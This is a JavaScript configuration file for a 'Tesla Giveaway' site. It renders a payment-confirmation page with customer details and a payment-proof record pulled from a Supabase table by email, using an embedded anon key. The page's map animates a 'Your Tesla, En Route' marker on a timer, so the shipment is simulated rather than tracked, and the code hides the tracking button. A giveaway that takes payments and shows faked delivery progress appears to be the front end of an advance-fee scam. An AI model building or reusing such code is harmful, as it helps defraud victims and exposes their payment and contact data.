// Tesla Giveaway — shared browser configuration
(function (global) {
  'use strict';

  var deployedApiBase = '__TESLA_API_BASE__';
  var fallbackApiBase = 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
  var injected = deployedApiBase.indexOf('__') !== 0;
  function normalize(v) { return String(v || '').trim().replace(/\/+$/, ''); }
  global.TESLA_API_BASE = normalize(global.TESLA_API_BASE || (injected ? deployedApiBase : fallbackApiBase));

  global.TESLA_CURRENCIES = [
    {code:'USD',symbol:'$',label:'US Dollar'},{code:'EUR',symbol:'€',label:'Euro'},
    {code:'GBP',symbol:'£',label:'British Pound'},{code:'CAD',symbol:'C$',label:'Canadian Dollar'},
    {code:'AUD',symbol:'A$',label:'Australian Dollar'},{code:'NGN',symbol:'₦',label:'Nigerian Naira'},
    {code:'GHS',symbol:'₵',label:'Ghanaian Cedi'},{code:'KES',symbol:'KSh',label:'Kenyan Shilling'},
    {code:'ZAR',symbol:'R',label:'South African Rand'},{code:'INR',symbol:'₹',label:'Indian Rupee'},
    {code:'JPY',symbol:'¥',label:'Japanese Yen'},{code:'CNY',symbol:'¥',label:'Chinese Yuan'},
    {code:'CHF',symbol:'Fr',label:'Swiss Franc'},{code:'AED',symbol:'AED',label:'UAE Dirham'},
    {code:'BRL',symbol:'R$',label:'Brazilian Real'}
  ];
  global.teslaCurrencySymbol = function(code) {
    var list=global.TESLA_CURRENCIES||[];
    for(var i=0;i<list.length;i++) if(list[i].code===code) return list[i].symbol;
    return code || '$';
  };

  if (!/payment-confirmation\.html$/i.test(global.location.pathname)) return;

  var earlyStyle = document.createElement('style');
  earlyStyle.id = 'payment-confirmation-authoritative-style';
  earlyStyle.textContent = '#vehicleImg{visibility:hidden!important;} .pc-nav-label{display:none!important;} #trackBtn{display:none!important;}';
  (document.head || document.documentElement).appendChild(earlyStyle);

  var VEHICLE_IMAGES = {
    cybertruck:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };
  function clean(v){return String(v==null?'':v).trim();}
  function key(v){return clean(v).toLowerCase().replace(/[^a-z0-9]/g,'');}
  function el(id){return document.getElementById(id);}
  function set(id,v){var n=el(id); if(n && clean(v)) n.textContent=String(v);}
  function first(obj, keys){
    if(!obj || typeof obj!=='object') return null;
    for(var i=0;i<keys.length;i++){
      var parts=keys[i].split('.'), cur=obj;
      for(var j=0;j<parts.length && cur!=null;j++) cur=cur[parts[j]];
      if(cur!=null && clean(cur)) return cur;
    }
    return null;
  }
  function localOrder(){try{return JSON.parse(localStorage.getItem('tesla_last_order')||'null');}catch(e){return null;}}
  function sessionToken(){return (typeof getSession==='function'?getSession():null)||localStorage.getItem('tesla_session')||localStorage.getItem('tesla_session_token')||'';}
  function apiBase(){return global.TESLA_API_BASE || fallbackApiBase;}

  function resolveVehicle(order){
    var c=order && (order.selectedCar || order.car || order.vehicle || {});
    var raw=first(c,['id','model','name','slug','key']);
    var k=key(raw);
    if(k==='modely'||k==='y'||k.indexOf('modely')>=0) return 'modely';
    if(k==='model3'||k==='3'||k.indexOf('model3')>=0) return 'model3';
    if(k==='modelx'||k==='x'||k.indexOf('modelx')>=0) return 'modelx';
    if(k==='cybertruck'||k.indexOf('cybertruck')>=0) return 'cybertruck';
    if(k==='models'||k==='s'||k.indexOf('models')>=0) return 'models';
    return null;
  }

  function renderVehicle(order){
    var img=el('vehicleImg'), name=el('vehicleName');
    if(!img) return;
    var c=order && (order.selectedCar||order.car||order.vehicle||{}), k=resolveVehicle(order);
    if(!k || !VEHICLE_IMAGES[k]) return;
    var label=first(c,['name','model']) || ({modely:'Model Y',model3:'Model 3',modelx:'Model X',models:'Model S',cybertruck:'Cybertruck'})[k];
    if(name) name.textContent='Tesla '+label;
    img.style.visibility='hidden';
    var expected=VEHICLE_IMAGES[k], loader=new Image();
    loader.onload=function(){img.src=expected;img.style.visibility='visible';};
    loader.onerror=function(){img.style.visibility='hidden';};
    loader.src=expected;
  }

  function renderOrder(order,user){
    if(!order) return;
    var dd=order.deliveryDetails||order.delivery||{}, pm=order.paymentMethod||order.payment||{}, dm=order.deliveryMethod||order.deliveryOption||{}, u=user||order.user||{}, proof=order.paymentProof||order.payment_proof||order.proof||{};
    set('orderId',first(order,['orderId','id','order_id']));
    set('trackingNum',first(order,['trackingNumber','tracking_number','tracking']));
    var od=first(order,['orderDate','order_date','createdAt','created_at']);
    if(od){var d=new Date(od);set('orderDate',isNaN(d.getTime())?od:d.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}));}
    set('estDelivery',first(order,['estimatedDelivery','estimated_delivery']));
    set('paymentMethod',first(pm,['name','label','type','method']));
    set('deliveryMethod',first(dm,['name','label','type','method']));
    var fullName=first(u,['fullName','name']) || [first(u,['firstName','first_name']),first(u,['lastName','last_name'])].filter(Boolean).join(' ');
    set('custName',fullName || first(dd,['fullName','name']));
    set('custEmail',first(u,['email'])||first(order,['customerEmail','customer_email','email'])||first(dd,['email']));
    set('custPhone',first(u,['phone','phoneNumber','phone_number'])||first(dd,['phone','phoneNumber','phone_number']));
    set('delName',first(dd,['fullName','name','recipientName','recipient_name']));
    set('delAddr',first(dd,['address','street','streetAddress','street_address']));
    set('delCity',first(dd,['city']));
    set('delStateZip',[first(dd,['state','province']),first(dd,['zipCode','zip','postalCode','postal_code'])].filter(Boolean).join(' '));
    set('delCountry',first(dd,['country','countryName','country_name']));
    // Keep payment details populated even if the payment_proofs request is unavailable.
    var localStatus=first(proof,['status','payment_status','proof_status'])||first(order,['paymentStatus','payment_status','proofStatus','proof_status'])||first(pm,['status','paymentStatus']);
    var localDate=first(proof,['created_at','submitted_at','payment_submitted_at','paymentSubmittedAt'])||first(order,['paymentSubmittedAt','payment_submitted_at']);
    var localMethod=first(proof,['payment_method','paymentMethod','method'])||first(pm,['name','label','type','method']);
    var localProof=first(proof,['proof_url','payment_proof_url','paymentProofUrl','receipt_url']);
    set('proofStatus',localStatus ? String(localStatus).replace(/^./,function(c){return c.toUpperCase();}) : 'Pending');
    if(localDate){var pd=new Date(localDate);set('proofDate',isNaN(pd.getTime())?localDate:pd.toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'}));}
    set('proofMethod',localMethod);
    if(localProof){var pw=el('proofImgWrap'),pi=el('proofImg');if(pw&&pi){pi.src=localProof;pw.style.display='block';}}
    renderVehicle(order);
    renderRouteMap(dd);
  }

  function renderProof(row){
    if(!row) return;
    var status=first(row,['status','payment_status','proof_status']);
    var submitted=first(row,['created_at','submitted_at','payment_submitted_at','paymentSubmittedAt']);
    var method=first(row,['payment_method','paymentMethod','method']);
    var proof=first(row,['proof_url','payment_proof_url','paymentProofUrl','receipt_url']);
    set('proofStatus',status ? String(status).replace(/^./,function(c){return c.toUpperCase();}) : 'Pending');
    if(submitted){var d=new Date(submitted);set('proofDate',isNaN(d.getTime())?submitted:d.toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'}));}
    set('proofMethod',method);
    if(proof){var wrap=el('proofImgWrap'),img=el('proofImg');if(wrap&&img){img.src=proof;wrap.style.display='block';}}
  }

  function fetchProof(email){
    if(!email) return Promise.resolve(null);
    var anon=global.SUPABASE_ANON_KEY||'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw';
    var url='https://puebwzumwqizgbmksrpq.supabase.co/rest/v1/payment_proofs?select=*&customer_email=eq.'+encodeURIComponent(email)+'&order=created_at.desc&limit=1';
    return fetch(url,{headers:{apikey:anon,Authorization:'Bearer '+anon}}).then(function(r){return r.ok?r.json():[]}).then(function(rows){if(rows&&rows[0]){renderProof(rows[0]);return rows[0];}return null;}).catch(function(){return null;});
  }

  function clearMap(){
    var old=el('confMap');
    if(!old) return null;
    var node=document.createElement('div');
    node.id='confMap';
    node.className=old.className;
    node.style.cssText=old.getAttribute('style')||'';
    old.parentNode.replaceChild(node,old);
    return node;
  }
  function renderRouteMap(dd){
    if(!global.L || !el('confMap')) return;
    var heading=document.querySelector('#mapCard .section-label');
    if(heading){heading.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"/><line x1="8" y1="2" x2="8" y2="18"/><line x1="16" y1="6" x2="16" y2="22"/></svg>Delivery Route';}
    var node=clearMap();
    var origin=[37.4936,-121.9448], dest=[40.7128,-74.0060];
    var city=first(dd||{},['city'])||'', state=first(dd||{},['state','province'])||'', country=first(dd||{},['country'])||'';
    var map=L.map(node).setView([(origin[0]+dest[0])/2,(origin[1]+dest[1])/2],4);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png',{attribution:'© OpenStreetMap © CARTO',maxZoom:19}).addTo(map);
    var rI=L.divIcon({html:'<div style="width:14px;height:14px;background:#E31937;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(227,25,55,.5)"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
    var gI=L.divIcon({html:'<div style="width:14px;height:14px;background:#00A550;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(0,165,80,.5)"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
    var tI=L.divIcon({html:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2"><rect x="1" y="3" width="15" height="13"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>',className:'',iconSize:[24,24],iconAnchor:[12,12]});
    L.marker(origin,{icon:rI}).addTo(map).bindPopup('<strong>Tesla Factory</strong><br>Fremont, CA — Origin');
    var destMarker=L.marker(dest,{icon:gI}).addTo(map).bindPopup('<strong>Delivery Destination</strong><br>'+(city||'Your address')+(country?', '+country:''));
    var tesla=L.marker([(origin[0]+dest[0])/2,(origin[1]+dest[1])/2],{icon:tI}).addTo(map).bindPopup('<strong>Your Tesla</strong><br>En Route');
    var line=L.polyline([origin,dest],{color:'#E31937',weight:2.5,opacity:.55,dashArray:'8,8'}).addTo(map);
    map.fitBounds(L.latLngBounds([origin,dest]),{padding:[40,40]});
    if(city||country){fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q='+encodeURIComponent([city,state,country].filter(Boolean).join(', '))).then(function(r){return r.json()}).then(function(rows){if(rows&&rows[0]){dest=[parseFloat(rows[0].lat),parseFloat(rows[0].lon)];destMarker.setLatLng(dest);line.setLatLngs([origin,dest]);map.fitBounds(L.latLngBounds([origin,dest]),{padding:[40,40]});}}).catch(function(){});}
    var p=.5;setInterval(function(){p=(p+.003)%1;tesla.setLatLng([origin[0]+(dest[0]-origin[0])*p,origin[1]+(dest[1]-origin[1])*p]);},80);
  }

  function removeHeader(){var n=document.querySelector('.pc-nav-label');if(n)n.remove();}
  function removeTrack(){var n=document.getElementById('trackBtn');if(n)n.remove();}
  function loadAuthoritative(){
    removeHeader();removeTrack();
    var local=localOrder(), token=sessionToken();
    if(local) renderOrder(local,local.user||{});
    var req=token?fetch(apiBase()+'/session?token='+encodeURIComponent(token)).then(function(r){return r.ok?r.json():null;}).catch(function(){return null;}):Promise.resolve(null);
    req.then(function(data){
      var order=data&&data.valid&&data.order?data.order:local;
      var user=data&&data.valid?data.user:(local&&local.user)||{};
      if(order) renderOrder(order,user);
      var email=first(user,['email'])||first(order||{},['customerEmail','customer_email','email'])||first(order&&order.deliveryDetails||{},['email']);
      return fetchProof(email);
    }).then(function(){removeHeader();removeTrack();});
  }
  function start(){
    setTimeout(loadAuthoritative,0);
    setTimeout(loadAuthoritative,1000);
    setTimeout(function(){removeHeader();removeTrack();},2500);
  }
  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',start,{once:true}); else start();
})(window);
